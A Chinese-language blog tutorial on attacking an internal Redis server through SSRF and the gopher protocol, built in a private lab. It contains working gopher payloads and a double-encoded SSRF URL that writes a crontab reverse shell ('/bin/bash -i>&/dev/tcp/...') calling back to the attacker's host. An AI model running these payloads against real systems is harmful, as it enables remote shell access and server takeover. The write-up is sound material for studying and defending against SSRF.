# <center>SSRF 攻击 Redis Getshell（生成 gopher payload）</center>

## 📍 目录

>  * 前言
>  * gopher 协议概述
>  * 构造和生成 payload
>  * SSRF+gopher 访问内网 redis
>  * 后话

## 📍 前言

这篇博客就不细讲 SSRF+gopher 的具体攻击过程了，主要针对 gopher 协议的特点生成 payload 做一点微小的研究。

## 📍 gopher 协议概述

```
gopher://192.168.0.105:70/_ + DATA
```

使用 gopher 协议时若不指定端口则向默认端口 70 发送数据。后面的 `_` 是必需的，可以是任意字符，不会被传输，但是必须要有，表示后面接着的都是要传输的数据。

只要精心构造 `DATA` ，就可以通过 gopher 协议访问 redis、mysql 或者发送 GET/POST 请求。

### 访问 Redis

简述一下环境：

```
0.101 攻击者
0.100 redis 服务器
0.104 web 服务器
```

首先要搞清楚访问 redis 时每次发送的数据是怎样的，所以先用 `socat` 监听 4444 端口，将 redis 的 6379 端口转发至 4444 来监听 gopher 访问 redis 的流量：

```
// redis 服务器执行
$ socat -v tcp-listen:4444,fork tcp-connect:192.168.0.100:6379
```

然后在攻击机 `redis-cli` 连接 redis 服务器的 4444 端口，运行一些常见指令，这里 redis 的密码是 123456。

![Screenshot 2020-06-26 上午4.40.02](pic/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.40.02.jpg)

命令依次是输入密码、显示所有键，输出 `name` 键的值。

查看 redis 服务器，得到的回显如下：

![Screenshot 2020-06-26 上午4.39.59](pic/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.39.59.jpg)

那么，如果我们构造 gopher 的 `DATA` 也是这种格式的话，就可以获取到数据。借助 web 服务器利用 SSRF 就可以达到攻击内网 redis 的目的。

### gopher 协议转换规则

gopher 协议支持 url 编码后的 % 编码，但很多字符用常见的 url 编码器并不会编码，如果部分字符不编码，则 `curl` 不解析。所以最好所有字符都编码。

简单记录几点：

> - 如果第一个字符是 `>` 或者 `<` 那么丢弃该行字符串，表示请求和返回的时间。
> - 如果前 3 个字符是 `+OK` 那么丢弃该行字符串，表示返回的字符串。
> - 将 `\r` 字符串替换成 `%0d%0a` 
> - 空白行替换为 `%0a` 

## 📍 构造和生成 Payload

写了一个[脚本](https://github.com/NickYan7/gopher_payload_generator)，将 redis 指令写入 `bin.txt` ，然后脚本直接输出 `payload` ，如图：

![Screenshot 2020-06-26 上午4.59.50](pic/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%884.59.50.jpg)

`\r` 表示换行，这里就不用写了。

payload：`curl gopher://192.168.0.100:6379/_%2a%32%0d%0a%24%34%0d%0a%41%55%54%48%0d%0a%24%36%0d%0a%31%32%33%34%35%36%0d%0a%2a%32%0d%0a%24%34%0d%0a%6b%65%79%73%0d%0a%24%31%0d%0a%2a%0d%0a`

`curl` 支持 gopher 协议。可以看到返回了所有键：

![Screenshot 2020-06-26 上午5.04.03](pic/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%885.04.03.jpg)

## 📍 SSRF+gopher 攻击内网 Redis

### 写入 crontab 计划任务反弹 shell

写入 crontab 计划任务需要目标的 redis 服务是 root 权限，其实有点苛刻。简述一下环境：

```
0.101 攻击者
0.100 redis 服务器，只开放给局域网内
0.105 web 服务器，php 支持 curl_exec
```

首先构造 payload：

```
*2\r
$4\r
auth\r
$6\r
123456\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$15\r
/var/spool/cron\r
*3\r
$3\r
set\r
$3\r
xxx\r
$62\r


*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.101/4646 0>&1

\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
*1\r
$4\r
save\r
```

脚本转换得到：

```
*2%0d%0a$4%0d%0aauth%0d%0a$6%0d%0a123456%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/spool/cron%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0axxx%0d%0a$62%0d%0a%0a%0a*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.101/4646 0>&1%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

攻击者本地监听 4646 端口，web 服务器的 SSRF 漏洞点位于 ssrf.php。由于先访问 web 服务器，会编码解码一次，ssrf 在访问内网 redis 时又要解码一次，所以 gopher 请求部分的内容需要二次 url 编码。

构造 payload：

```
http://192.168.0.105/ssrf_test/ssrf.php?url=gopher%3a%2f%2f192.168.0.100%3a6379%2f_*2%250d%250a%244%250d%250aauth%250d%250a%246%250d%250a123456%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2415%250d%250a%2fvar%2fspool%2fcron%250d%250a*3%250d%250a%243%250d%250aset%250d%250a%243%250d%250axxx%250d%250a%2462%250d%250a%250a%250a*%2f1+*+*+*+*+%2fbin%2fbash+-i%3e%26%2fdev%2ftcp%2f192.168.0.101%2f4646+0%3e%261%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a
```

浏览器访问（没有回显）：

![Screenshot 2020-06-26 上午7.40.42](pic/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%887.40.42.jpg)

一分钟后，攻击者的机器弹回内网 redis 服务器的 shell：

![Screenshot 2020-06-26 上午7.40.22](pic/Screenshot%202020-06-26%20%E4%B8%8A%E5%8D%887.40.22.jpg)

## 📍 后话

这只是 SSRF+gopher 众多玩法中的一点而已，复现过程中其实小坑还是蛮多的：

* `curl` 的 payload 格式和 http 请求的格式有些许不同，为此我写了两个用来转换 payload 的脚本。
* 浏览器请求时一定要注意 gopher 部分的二次编码。
* 如果是自己搭环境测试，要注意 php 支持 curl_exec 扩展才能进行 gopher 请求，php 版本要大于 3.3。

### 访问 mysql

访问 mysql 的步骤和访问 redis 其实大同小异，也是先监听端口转发流量分析流量的格式。但是有一个问题我一直没搞明白：redis 允许先连接，然后 `auth password` 这种方式来认证，方便分析流量，但是 mysql 在进行连接时必须带参数 `-p` 来输入密码，这样的话第一步密码的流量就抓不到了，那还怎么连 mysql 呢？费解。

### 发送 GET/POST 数据

浏览器访问，Burp 抓包，然后另存为文件，其他的思路都差不多。

